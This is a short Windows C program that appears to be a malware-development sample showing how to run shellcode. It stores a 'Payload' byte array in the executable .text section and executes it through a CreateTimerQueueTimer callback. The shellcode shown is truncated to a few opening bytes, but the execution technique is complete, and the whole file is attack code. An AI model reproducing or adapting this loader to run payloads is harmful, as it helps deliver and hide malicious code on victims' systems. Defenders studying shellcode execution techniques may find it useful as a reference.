#include <stdio.h>
#include <Windows.h>
#pragma section(".text")
__declspec(allocate(".text")) const unsigned char Payload[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
};

int main() {

	HANDLE hTimer = NULL;

	printf("[i] Payload At : 0x%p \n", Payload);
	if (!CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)Payload, 1000, NULL, NULL, NULL)) {
		printf("[!] CreateTimerQueueTimer Failed With Error : %d \n", GetLastError());
		return -1;
	}

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}

